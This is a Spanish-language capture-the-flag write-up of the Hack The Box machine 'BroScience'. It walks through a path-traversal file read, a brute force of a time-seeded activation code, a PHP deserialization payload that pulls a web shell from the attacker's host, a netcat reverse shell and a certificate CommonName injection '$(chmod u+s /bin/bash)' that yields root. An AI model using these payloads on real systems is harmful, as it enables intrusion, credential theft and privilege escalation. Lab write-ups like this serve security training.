---
layout: post
title: BroScience
date: 2023-04-15
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/BroScience-htb/BroScience.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.195 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 14:00 GMT
Nmap scan report for 10.10.11.195
Host is up (0.069s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,443 10.10.11.195 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 14:01 GMT
Nmap scan report for 10.10.11.195
Host is up (0.085s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
|_http-title: BroScience : Home
|_ssl-date: TLS randomness does not represent time
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.26 seconds
```

Añado el dominio ```broscience.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.195
http://10.10.11.195 [301 Moved Permanently] Apache[2.4.54], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.10.11.195], RedirectLocation[https://broscience.htb/], Title[301 Moved Permanently]
https://broscience.htb/ [200 OK] Apache[2.4.54], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.10.11.195], Script, Title[BroScience : Home]
```

La página principal se ve así:

<img src="/writeups/assets/img/BroScience-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u https://broscience.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 --no-error -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://broscience.htb/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/04/17 14:07:18 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> https://broscience.htb/images/]
/includes             (Status: 301) [Size: 321] [--> https://broscience.htb/includes/]
/manual               (Status: 301) [Size: 319] [--> https://broscience.htb/manual/]  
/javascript           (Status: 301) [Size: 323] [--> https://broscience.htb/javascript/]
/styles               (Status: 301) [Size: 319] [--> https://broscience.htb/styles/]    
                                                                                        
===============================================================
2023/04/17 14:07:28 Finished
===============================================================
```

Dentro de ```includes``` hay dos archivos en PHP

```null
gobuster fuzz -u https://broscience.htb/includes/FUZZ.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 --no-error -k -b 404
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://broscience.htb/includes/FUZZ.php
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Excluded Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/04/17 14:08:01 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=39] https://broscience.htb/includes/img.php
Found: [Status=200] [Length=369] https://broscience.htb/includes/header.php
```

El ```img.php``` requiere de un parámetro

```null
curl -s -X GET https://broscience.htb/includes/img.php -k | html2text
Error: Missing 'path' parameter.
```

Es vulnerable a LFI, urlencodeando dos veces la ruta sin el nombre, es decir, el ```../```

```null
GET /includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc%25%32%66passwd HTTP/1.1
Host: broscience.htb
Cookie: PHPSESSID=fl8udn5v7gjohp3jf5haal1ea6
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```null
HTTP/1.1 200 OK
Date: Mon, 17 Apr 2023 14:12:43 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 2235
Connection: close
Content-Type: image/png

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Me registro en ```register.php```, pero es necesario un código de activación

<img src="/writeups/assets/img/BroScience-htb/2.png" alt="">

<img src="/writeups/assets/img/BroScience-htb/3.png" alt="">

Me traigo el ```index.php```

```null
GET /includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66var%25%32%66www%25%32%66html%25%32%66index.php 
```

```null
<?php
session_start();
?>

<html>
    <head>
        <title>BroScience : Home</title>
        <?php 
        include_once 'includes/header.php';
        include_once 'includes/utils.php';
        $theme = get_theme();
        ?>
        <link rel="stylesheet" href="styles/<?=$theme?>.css">
    </head>
    <body class="<?=get_theme_class($theme)?>">
        <?php include_once 'includes/navbar.php'; ?>
        <div class="uk-container uk-margin">
            <!-- TODO: Search bar -->
            <?php
            include_once 'includes/db_connect.php';
                    
            // Load exercises
            $res = pg_query($db_conn, 'SELECT exercises.id, username, title, image, SUBSTRING(content, 1, 100), exercises.date_created, users.id FROM exercises JOIN users ON author_id = users.id');
            if (pg_num_rows($res) > 0) {
                echo '<div class="uk-child-width-1-2@s uk-child-width-1-3@m" uk-grid>';
                while ($row = pg_fetch_row($res)) {
                    ?>
                    <div>
                        <div class="uk-card uk-card-default <?=(strcmp($theme,"light"))?"uk-card-secondary":""?>">
                            <div class="uk-card-media-top">
                                <img src="includes/img.php?path=<?=$row[3]?>" width="600" height="600" alt="">
                            </div>
                            <div class="uk-card-body">
                                <a href="exercise.php?id=<?=$row[0]?>" class="uk-card-title"><?=$row[2]?></a>
                                <p><?=$row[4]?>... <a href="exercise.php?id=<?=$row[0]?>">keep reading</a></p>
                            </div>
                            <div class="uk-card-footer">
                                <p class="uk-text-meta">Written by <a class="uk-link-text" href="user.php?id=<?=$row[6]?>"><?=htmlspecialchars($row[1],ENT_QUOTES,'UTF-8')?></a> <?=rel_time($row[5])?></p>
                            </div>
                        </div>
                    </div>
                    
                    <?php
                }
                echo '</div>';
            } 
            ?>
        </div>
    </body>
</html>
```

Me traigo el ```db_connect.php``` y el ```utils.php```

```null
GET /includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66var%25%32%66www%25%32%66html%25%32%66includes%25%32%66db_connect.php
```

```null
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```

Puedo ver las credenciales de acceso a la base de datos en texto claro

```null
GET /includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66var%25%32%66www%25%32%66html%25%32%66includes%25%32%66utils.php
```

```null
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)
function rel_time($from, $to = null) {
    $to = (($to === null) ? (time()) : ($to));
    $to = ((is_int($to)) ? ($to) : (strtotime($to)));
    $from = ((is_int($from)) ? ($from) : (strtotime($from)));

    $units = array
    (
        "year"   => 29030400, // seconds in a year   (12 months)
        "month"  => 2419200,  // seconds in a month  (4 weeks)
        "week"   => 604800,   // seconds in a week   (7 days)
        "day"    => 86400,    // seconds in a day    (24 hours)
        "hour"   => 3600,     // seconds in an hour  (60 minutes)
        "minute" => 60,       // seconds in a minute (60 seconds)
        "second" => 1         // 1 second
    );

    $diff = abs($from - $to);

    if ($diff < 1) {
        return "Just now";
    }

    $suffix = (($from > $to) ? ("from now") : ("ago"));

    $unitCount = 0;
    $output = "";

    foreach($units as $unit => $mult)
        if($diff >= $mult && $unitCount < 1) {
            $unitCount += 1;
            // $and = (($mult != 1) ? ("") : ("and "));
            $and = "";
            $output .= ", ".$and.intval($diff / $mult)." ".$unit.((intval($diff / $mult) == 1) ? ("") : ("s"));
            $diff -= intval($diff / $mult) * $mult;
        }

    $output .= " ".$suffix;
    $output = substr($output, strlen(", "));

    return $output;
}

class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
		$this->theme = $theme;
    }
}

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

function get_theme_class($theme = null) {
    if (!isset($theme)) {
        $theme = get_theme();
    }
    if (strcmp($theme, "light")) {
        return "uk-light";
    } else {
        return "uk-dark";
    }
}

function set_theme($val) {
    if (isset($_SESSION['id'])) {
        setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));
    }
}

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>
```

En algún sitio se tiene que introducir el código que se genera, por lo que fuzzeo por scripts en PHP desde la raíz

```nulll
gobuster fuzz -u https://broscience.htb/FUZZ.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 300 --no-error -k -b 404
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://broscience.htb/FUZZ.php
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Excluded Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/04/17 14:40:42 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=302] [Length=0] https://broscience.htb/logout.php
Found: [Status=200] [Length=2161] https://broscience.htb/register.php
Found: [Status=200] [Length=1936] https://broscience.htb/login.php   
Found: [Status=200] [Length=1309] https://broscience.htb/user.php    
Found: [Status=302] [Length=13] https://broscience.htb/comment.php   
Found: [Status=200] [Length=9301] https://broscience.htb/index.php   
Found: [Status=200] [Length=1256] https://broscience.htb/activate.php
                                                                     
===============================================================
2023/04/17 14:40:45 Finished
===============================================================
```

Encuentro un ```activate.php```

```null
curl -s -X GET https://broscience.htb/activate.php -k | html2text


BroScience
    * Log_In
 Missing activation code.
```

El código se debe introducir en un parámetro por GET, ```?code=```. Creo un script en PHP que se encargue de generar códigos tomando como semilla el tiempo actual

```null
<?php

function generate_activation_code($t) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand($t);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

$start = strtotime(shell_exec("date"));
for ($t = $start - 30; $t <= $start + 30; $t++) {
    echo generate_activation_code($t) . "\n";
}

?>
```

Con ```wfuzz``` los bruteforceo

```null
wfuzz -c --hs 'Invalid' -w /home/rubbx/Desktop/HTB/Machines/BroScience/dictionary.txt 'https://broscience.htb/activate.php?code=FUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://broscience.htb/activate.php?code=FUZZ
Total requests: 61

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000030:   200        27 L     65 W       1251 Ch     "N23PSFDzvDU088C1p8IXicN6BUmq83wE"                                                                                                             

Total time: 0
Processed Requests: 61
Filtered Requests: 60
Requests/sec.: 0
```

La haberse tramitado la petición ya, la cuenta está activada. Me puedo loggear. Como se podía ver en la función ```set_theme()``` en el ```utils.php```, la cooki está compuesta por una cadena serializada

```null
echo Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30=  | base64 -d
O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}
```

La clase que se encargaba de la serialización, está utilizando ```__wakeup()``` que es una Magic Function

```null
class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>
```

Creo mi propia data serializada que apunte a un archivo PHP en mi equipo que se encargue de enviarme una reverse shell

```null
<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.16.3/cmd.php" ;
    public $imgPath = "./cmd.php"; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$payload = serialize(new AvatarInterface);
echo base64_encode($payload);

?>
```

Y el ```cmd.php```

```null
<?php
  system($_REQUEST['cmd']);
?>
```

Ejecuto el comando que me envía la reverse shell

```null
curl -s -X GET 'https://broscience.htb/cmd.php?cmd=nc%20-e%20/bin/bash%2010.10.16.3%20443' -k
```

Y la recibo en una sesión de netcat

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.195] 50896
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@broscience:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@broscience:/var/www/html$ export TERM=xterm
www-data@broscience:/var/www/html$ export SHELL=bash
www-data@broscience:/var/www/html$ stty rows 55 columns 209
```

```null
www-data@broscience:/var/www/html$ hostname -I
10.10.11.195 dead:beef::250:56ff:feb9:d67e 
```

Me conecto al PostgresSQL

```null
www-data@broscience:/tmp$ psql -U dbuser -d broscience -h localhost
Password for user dbuser: 
psql (13.9 (Debian 13.9-0+deb11u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

broscience=> 
```

Listo las bases de datos

```null
broscience=> \list
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 broscience | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

Para ```broscience``` las tablas


```null
broscience=> \dt
           List of relations
 Schema |   Name    | Type  |  Owner   
--------+-----------+-------+----------
 public | comments  | table | postgres
 public | exercises | table | postgres
 public | users     | table | postgres
(3 rows)
```

Y dumpeo todos los datos de ```users```

```null
broscience=> select * from users; 
 id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
(5 rows)
```

Los intento crackear, pero se está empleando un salt

```null
john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2023-04-17 16:03) 0g/s 23134Kp/s 23134Kc/s 115671KC/s  filimani..*7¡Vamos!
Session completed.
```

Se lo añado al final

```null
15657792073e8a843d4f91fc403454e1:NaCl
13edad4932da9dbb57d9cd15b66ed104:NaCl
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
a7eed23a7be6fe0d765197b1027453fe:NaCl
5d15340bded5b9395d5d14b9c21bc82b:NaCl
```

Los crackeo con ```hashcat```

```null
hashcat -m 20 -a 0 hashes /usr/share/wordlists/rockyou.txt --show
13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest
```

Una es válido por SSH para el usuario ```bill```. Puedo ver la primera flag

```null
www-data@broscience:/tmp$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

```null
ssh bill@10.10.11.195
The authenticity of host '10.10.11.195 (10.10.11.195)' can't be established.
ED25519 key fingerprint is SHA256:qQRm/99RG60gqk9HTpyf93940WYoqJEnH+MDvJXkM6E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.195' (ED25519) to the list of known hosts.
bill@10.10.11.195's password: 
Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan  2 04:45:21 2023 from 10.10.14.40
bill@broscience:~$ cat user.txt 
76936bad6cf8e74f6663061d480e9618
```

## Escalada

Subo el ```pspy``` para detectar tareas que se ejecutan a intervalos regulares de tiempo

```null
2023/04/17 13:22:01 CMD: UID=0    PID=4866   | /usr/sbin/CRON -f 
2023/04/17 13:22:01 CMD: UID=0    PID=4867   | /bin/sh -c /root/cron.sh 
2023/04/17 13:22:01 CMD: UID=0    PID=4868   | /bin/bash /root/cron.sh 
2023/04/17 13:22:01 CMD: UID=0    PID=4869   | /bin/bash /root/cron.sh 
2023/04/17 13:22:01 CMD: UID=0    PID=4870   | /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt 
2023/04/17 13:22:01 CMD: UID=0    PID=4871   | 
2023/04/17 13:22:01 CMD: UID=0    PID=4872   | /usr/bin/rm -r /home/bill/Certs/. /home/bill/Certs/.. 
2023/04/17 13:23:03 CMD: UID=117  PID=4876   | postgres: 13/main: autovacuum worker postgres                                                                             
2023/04/17 13:24:01 CMD: UID=0    PID=4880   | /usr/sbin/CRON -f 
2023/04/17 13:24:01 CMD: UID=0    PID=4881   | /bin/sh -c /root/cron.sh 
```

Se está ejecutando un script de bash localizado en ```/opt```

```null
bill@broscience:/dev/shm$ cat /opt/renew_cert.sh
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```

Para abusar de ello, creo una clave privada con ```openssl``` e inyecto un comando en el ComonName

```null
bill@broscience:~/Certs$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
bill@broscience:~/Certs$ openssl req -x509 -sha256 -nodes -days 1 -newkey rsa:4096 -keyout /dev/null -out broscience.crt
Generating a RSA private key
...................................................................................................................................................++++
.............................................................++++
writing new private key to '/dev/null'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)
Email Address []:
```

La bash pasa a ser SUID

```null
bill@broscience:~/Certs$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Puedo ver la segunda flag

```null
bash-5.1# cat /root/root.txt 
cc852cf7599ec0f17257f264690915e4
```